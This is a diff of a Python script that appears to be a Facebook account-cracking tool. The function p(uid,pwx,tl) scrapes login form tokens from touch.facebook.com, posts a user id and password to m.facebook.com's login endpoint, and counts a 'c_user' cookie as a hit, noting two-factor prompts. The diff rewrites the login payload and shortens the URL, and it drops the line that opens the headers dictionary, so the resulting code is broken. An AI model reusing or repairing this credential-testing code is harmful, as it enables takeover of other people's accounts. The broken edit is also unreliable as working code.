@@ -1346,32 +1346,29 @@ def p(uid,pwx,tl):
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com').text
             data = {
-            "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number": 0,
-            "unrecognized_tries": 0,
-            "email": uid,
-            "prefill_contact_point": uid,
-            "prefill_source": "browser_dropdown",
-            "prefill_type": "password",
-            "first_prefill_source": "browser_dropdown",
-            "first_prefill_type": "contact_point",
-            "had_cp_prefilled": True,
-            "had_password_prefilled": True,
-            "is_smart_lock": False,
-            "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(free_fb)).group(1),
-            "bi_wvdp": {"hwc": True, "hwcr": False, "has_dnt": True, "has_standalone": False, "hasPerm": True, "has_seWo": True, "has_meDe": True, "has_creds": True, "has_hwi_bt": False, "has_agjsi": False, "iframeProto": "function get contentWindow() { [native code] }", "iframeData": {"hwc": True, "hwcr": False, "has_dnt": True, "has_standalone": False, "hasPerm": True, "has_seWo": True, "has_meDe": True, "has_creds": True, "has_hwi_bt": False, "has_agjsi": False}},
-            "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-            "fb_dtsg": "",
-            "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "__dyn": "",
-            "__csr": "",
-            "__req": random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),
-            "__fmt": 1,
-            "__a": "",
-            "__user": 0}
-            headers = {
+'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+'try_number': '0',
+'unrecognized_tries': '0',
+'email': uid,
+'prefill_contact_point': '',
+'prefill_source': '',
+'prefill_type': '',
+'first_prefill_source': '',
+'first_prefill_type': '',
+'had_cp_prefilled': 'false',
+'had_password_prefilled': 'false',
+'is_smart_lock': 'true',
+'bi_xrwh': '0',
+'pass': pw,
+'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+'dyn': '',
+'csr': '',
+'req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),
+'a': '',
+'__user': '0',
+'_fb_noscript': 'true'}
             "Host": "m.facebook.com",
             "Connection": "keep-alive",
             "Content-Length": "2075",
@@ -1392,7 +1389,7 @@ def p(uid,pwx,tl):
             "Accept-Encoding": "gzip, deflate, br",
             "Accept-Language": "en-US,en;q=0.9"}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/device-based/login/async/?api_key=274266067164&auth_token=5632b47aa47bd661d18b53714ed804a9&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D274266067164%26cbt%3D1727857109841%26e2e%3D%257B%2522init%2522%253A1727857109841%257D%26ies%3D0%26sdk%3Dandroid-15.0.2%26sso%3Dchrome_custom_tab%26nonce%3De811d7a5-1c58-4736-a373-62736184ad5a%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522a637c4fc-08cb-47c0-9f86-43029b0b9b37%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ppg2jh4put95ccl7tguc%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.pinterest%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3D47cGdAHirRSZ9MdP8XILUi0QQAmFaJso9L9EzgmLG9Q%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da637c4fc-08cb-47c0-9f86-43029b0b9b37%26tp%3Dunspecified&refsrc=deprecated&app_id=274266067164&cancel=fbconnect%3A%2F%2Fcct.com.pinterest%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522a637c4fc-08cb-47c0-9f86-43029b0b9b37%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ppg2jh4put95ccl7tguc%2522%257D&lwv=100"
+            url = "https://m.facebook.com/login/device-based/login/async/"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
